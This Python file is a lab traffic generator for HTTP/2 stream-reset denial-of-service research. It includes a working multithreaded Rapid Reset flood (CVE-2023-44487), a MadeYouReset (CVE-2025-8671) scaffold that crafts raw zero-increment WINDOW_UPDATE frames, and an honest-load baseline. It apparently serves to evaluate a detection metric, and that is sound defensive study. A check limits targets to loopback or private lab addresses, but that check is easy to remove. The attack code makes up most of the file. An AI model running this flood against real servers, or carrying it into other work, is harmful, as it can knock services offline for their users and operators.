#!/usr/bin/env python3
"""
attack.py — traffic generator for the HTTP/2 stream-reset DoS lab.

Modes (the three evaluation scenarios from the proposal + the attacks):
    idle          no traffic (baseline)
    legit         honest concurrent HTTP/2 load (legitimate spike scenario)
    rapid-reset   CVE-2023-44487: open a stream, immediately RST_STREAM, repeat
    madeyoureset  CVE-2025-8671 research scaffold: crafted frames meant to make
                  the SERVER reset its own streams (see notes in that function)

SAFETY — this is an authorized academic lab tool. By design it refuses to run
against anything that is not the local lab: the target host must resolve to a
loopback or RFC-1918 private address, or be one of the lab service names
(guard/victim). Point it only at your own containerised victim. There is no
override flag on purpose.
"""
import argparse
import ipaddress
import socket
import sys
import time
import threading

import h2.config
import h2.connection
import h2.errors

LAB_HOSTS = {"guard", "victim", "localhost"}


def assert_lab_target(host: str):
    """Refuse to attack anything that is not the local lab."""
    if host in LAB_HOSTS:
        return
    try:
        addrs = {ai[4][0] for ai in socket.getaddrinfo(host, None)}
    except Exception as e:
        print(f"[safety] cannot resolve {host!r}: {e}", file=sys.stderr)
        sys.exit(2)
    for a in addrs:
        try:
            ip = ipaddress.ip_address(a)
        except ValueError:
            continue
        if not (ip.is_private or ip.is_loopback):
            print(f"[safety] refusing: {host} -> {a} is not a private/lab address.\n"
                  f"         This tool only targets your local lab victim.", file=sys.stderr)
            sys.exit(2)


def connect(host, port):
    cfg = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=cfg)
    s = socket.create_connection((host, port), timeout=10)
    conn.initiate_connection()
    s.sendall(conn.data_to_send())
    return s, conn


def drain(s, conn, budget=0.2):
    s.settimeout(budget)
    try:
        data = s.recv(65535)
        if data:
            conn.receive_data(data)
            out = conn.data_to_send()
            if out:
                s.sendall(out)
    except Exception:
        pass


# --- Rapid Reset (CVE-2023-44487) -------------------------------------------
def rapid_reset_worker(host, port, path, deadline, counters, idx):
    """One TCP/HTTP2 connection flooding HEADERS+RST_STREAM pairs."""
    try:
        s, conn = connect(host, port)
    except Exception as e:
        return
    sid = 1
    while time.time() < deadline:
        try:
            headers = [(":method", "GET"), (":path", path),
                       (":scheme", "http"), (":authority", f"{host}:{port}")]
            conn.send_headers(sid, headers, end_stream=True)
            # The attack: cancel the stream the instant it is opened, so the
            # server does per-request setup work but the per-connection
            # concurrent-stream limit is never reached.
            conn.reset_stream(sid, error_code=h2.errors.ErrorCodes.CANCEL)
            s.sendall(conn.data_to_send())
            with counters["lock"]:
                counters["sent"] += 1
            sid += 2
            if sid > 2_000_000_00:  # recycle the connection before stream-id exhaustion
                s.close()
                s, conn = connect(host, port)
                sid = 1
            if sid % 200 == 0:
                drain(s, conn, 0.01)
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            try:
                s, conn = connect(host, port)
                sid = 1
            except Exception:
                return
    try:
        s.close()
    except Exception:
        pass


def run_rapid_reset(args):
    assert_lab_target(args.host)
    deadline = time.time() + args.duration
    counters = {"sent": 0, "lock": threading.Lock()}
    print(f"[rapid-reset] {args.connections} conns x {args.duration}s against "
          f"{args.host}:{args.port}{args.path}", flush=True)
    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=rapid_reset_worker,
                             args=(args.host, args.port, args.path, deadline, counters, i),
                             daemon=True)
        t.start()
        threads.append(t)
    last = 0
    while time.time() < deadline:
        time.sleep(1.0)
        with counters["lock"]:
            now = counters["sent"]
        print(f"[rapid-reset] resets sent: {now:>8}  (+{now-last}/s)", flush=True)
        last = now
    for t in threads:
        t.join(timeout=2)
    print(f"[rapid-reset] done. total resets sent: {counters['sent']}", flush=True)


# --- Legitimate load (evaluation baseline / honest spike) -------------------
def legit_worker(host, port, path, deadline, counters):
    try:
        s, conn = connect(host, port)
    except Exception:
        return
    sid = 1
    while time.time() < deadline:
        try:
            headers = [(":method", "GET"), (":path", path),
                       (":scheme", "http"), (":authority", f"{host}:{port}")]
            conn.send_headers(sid, headers, end_stream=True)
            s.sendall(conn.data_to_send())
            # a well-behaved client waits for the response
            s.settimeout(5.0)
            done = False
            while not done:
                data = s.recv(65535)
                if not data:
                    break
                for ev in conn.receive_data(data):
                    if isinstance(ev, h2.events.StreamEnded) and ev.stream_id == sid:
                        done = True
                out = conn.data_to_send()
                if out:
                    s.sendall(out)
            with counters["lock"]:
                counters["sent"] += 1
            sid += 2
            if sid > 2_000_000_00:
                s.close(); s, conn = connect(host, port); sid = 1
        except Exception:
            try:
                s.close(); s, conn = connect(host, port); sid = 1
            except Exception:
                return


def run_legit(args):
    import h2.events  # noqa
    assert_lab_target(args.host)
    deadline = time.time() + args.duration
    counters = {"sent": 0, "lock": threading.Lock()}
    print(f"[legit] {args.connections} honest clients x {args.duration}s against "
          f"{args.host}:{args.port}{args.path}", flush=True)
    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=legit_worker,
                             args=(args.host, args.port, args.path, deadline, counters),
                             daemon=True)
        t.start(); threads.append(t)
    last = 0
    while time.time() < deadline:
        time.sleep(1.0)
        with counters["lock"]:
            now = counters["sent"]
        print(f"[legit] completed requests: {now:>8}  (+{now-last}/s)", flush=True)
        last = now
    for t in threads:
        t.join(timeout=2)
    print(f"[legit] done. total completed: {counters['sent']}", flush=True)


# --- MadeYouReset (CVE-2025-8671) RESEARCH SCAFFOLD -------------------------
def run_madeyoureset(args):
    """
    RESEARCH SCAFFOLD — Week-1 spike, not a finished exploit.

    MadeYouReset makes the *server* reset its own streams by sending spec-legal
    but invalid frames (e.g. WINDOW_UPDATE with a 0 increment, PRIORITY on an
    idle/closed stream, or frames on a half-closed stream) while the backend
    keeps processing the request. The distinguishing signal is therefore a rise
    in SERVER-initiated resets (victim_server_resets_total) with NO client-reset
    flood — which is exactly what the mismatch_ratio metric is built to catch.

    This scaffold sends a few candidate crafted-frame patterns so the team can
    watch victim_server_resets_total and the debug log (CLOSED_RST_TX) and
    confirm which pattern this pinned Tomcat actually resets on. Tighten the
    winning pattern into a sustained client in Week 1. See docs/MADEYOURESET.md.
    """
    assert_lab_target(args.host)
    print("[madeyoureset] RESEARCH SCAFFOLD — sending candidate crafted-frame "
          "patterns; watch victim_server_resets_total / CLOSED_RST_TX.", flush=True)
    s, conn = connect(args.host, args.port)
    sid = 1
    # Pattern A: open a request, then send WINDOW_UPDATE increment 0 (protocol
    # error on that stream -> server should RST_STREAM it).
    try:
        headers = [(":method", "GET"), (":path", args.path),
                   (":scheme", "http"), (":authority", f"{args.host}:{args.port}")]
        conn.send_headers(sid, headers, end_stream=False)
        s.sendall(conn.data_to_send())
        # craft a raw WINDOW_UPDATE frame with increment 0 on this stream
        # frame: length(3)=4, type(1)=0x08, flags(1)=0, stream_id(4), increment(4)=0
        raw = (4).to_bytes(3, "big") + b"\x08" + b"\x00" + sid.to_bytes(4, "big") + (0).to_bytes(4, "big")
        s.sendall(raw)
        time.sleep(0.2)
        drain(s, conn, 0.3)
        print("[madeyoureset] pattern A (WINDOW_UPDATE inc=0) sent on stream", sid, flush=True)
    except Exception as e:
        print("[madeyoureset] pattern A error:", e, flush=True)
    print("[madeyoureset] scaffold complete. If victim_server_resets_total rose, "
          "this pattern is a viable MadeYouReset trigger to develop. See docs.", flush=True)


def main():
    p = argparse.ArgumentParser(description="HTTP/2 stream-reset lab traffic generator (lab-only)")
    p.add_argument("mode", choices=["idle", "legit", "rapid-reset", "madeyoureset"])
    p.add_argument("--host", default="guard")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--path", default="/?ms=200")
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--connections", type=int, default=4)
    args = p.parse_args()

    if args.mode == "idle":
        print(f"[idle] no traffic for {args.duration}s (baseline)", flush=True)
        time.sleep(args.duration)
    elif args.mode == "legit":
        run_legit(args)
    elif args.mode == "rapid-reset":
        run_rapid_reset(args)
    elif args.mode == "madeyoureset":
        run_madeyoureset(args)


if __name__ == "__main__":
    main()
